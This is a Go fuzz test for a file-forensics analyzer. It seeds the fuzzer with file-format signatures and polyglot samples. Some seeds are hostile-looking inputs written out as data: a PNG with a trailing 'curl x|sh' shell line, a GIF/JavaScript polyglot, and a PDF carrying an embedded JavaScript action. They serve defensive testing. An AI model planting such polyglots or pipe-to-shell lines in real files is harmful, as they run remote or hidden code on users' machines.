package forensics

import (
	"bytes"
	"strings"
	"testing"
	"time"

	"github.com/traceforce/skill-xray/internal/parse"
	"github.com/traceforce/skill-xray/internal/testutil"
)

// FuzzAnalyzeAsset feeds one byte string to the forensics lane under every declared kind ingest
// would give it (.png asset, .zip nested archive, .pdf active asset, .pyc bytecode, .docx and
// .md decoded or not, versioned .so): signatures, polyglots, overlays and trailing bytes.
func FuzzAnalyzeAsset(f *testing.F) {
	png := "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x00IEND\xaeB`\x82"
	eocd := "PK\x05\x06" + string(make([]byte, 18))
	seeds := []string{
		png, png + "PK\x03\x04" + strings.Repeat("\x00", 26) + "x.txt" + "payload",
		png + "\x7fELF\x02\x01\x01", png + "MZ\x90\x00", png + "#!/bin/sh\ncurl x|sh\n",
		"\xff\xd8\xff\xe0\x00\x10JFIF\x00" + strings.Repeat("\x00", 20) + "\xff\xd9" + eocd,
		"GIF89a\x01\x00\x01\x00/*" + strings.Repeat("\x00", 8) + "*/=1;alert(1)",
		"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n1 0 obj<</JS(app.alert(1))>>endobj\n%%EOF",
		"PK\x03\x04" + strings.Repeat("\x00", 26) + "[Content_Types].xml" + eocd,
		"PK\x07\x08" + strings.Repeat("\x00", 12), eocd, strings.Repeat(eocd, 100),
		"\xa7\r\r\n" + strings.Repeat("\x00", 12) + "\xe3\x00\x00\x00", "\x7fELF\x01\x01\x01" + strings.Repeat("\x00", 40),
		"MZ" + strings.Repeat("\x00", 58) + "\x80\x00\x00\x00" + strings.Repeat("\x00", 64) + "PE\x00\x00",
		"\xcf\xfa\xed\xfe", "\xca\xfe\xba\xbe", "\x00asm\x01\x00\x00\x00", "Rar!\x1a\x07\x01\x00", "7z\xbc\xaf\x27\x1c",
		"\x1f\x8b\x08\x00", "BZh91AY&SY", "\xfd7zXZ\x00", "ustar", "just text\n", "", "\x00",
		strings.Repeat("A", 4096) + eocd, "PK\x05\x06" + "PK\x05\x06" + "PK\x03\x04",
	}
	for _, s := range seeds {
		f.Add([]byte(s))
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		text := string(bytes.ToValidUTF8(data, nil))
		p := &parse.Package{Artifacts: []*parse.Artifact{
			{Rel: "x.png", Kind: "asset", Raw: data},
			{Rel: "x.zip", Kind: "nested_archive", Raw: data},
			{Rel: "x.pdf", Kind: "active_asset", Raw: data},
			{Rel: "x.pyc", Kind: "python_bytecode", Raw: data},
			{Rel: "x.docx", Kind: "other", Raw: data},
			{Rel: "y.docx", Kind: "other", Raw: data, Text: &text},
			{Rel: "x.md", Kind: "instruction", Raw: data, Text: &text},
			{Rel: "lib.so.1.2", Kind: "native_code", Raw: data},
			{Rel: "x.jpg", Kind: "asset", Raw: data},
			{Rel: "x.gif", Kind: "asset", Raw: data},
		}}
		defer testutil.Hang(t, time.Now(), len(data))
		testutil.NoRecoveredPanic(t, AnalyzePackage(p))
	})
}
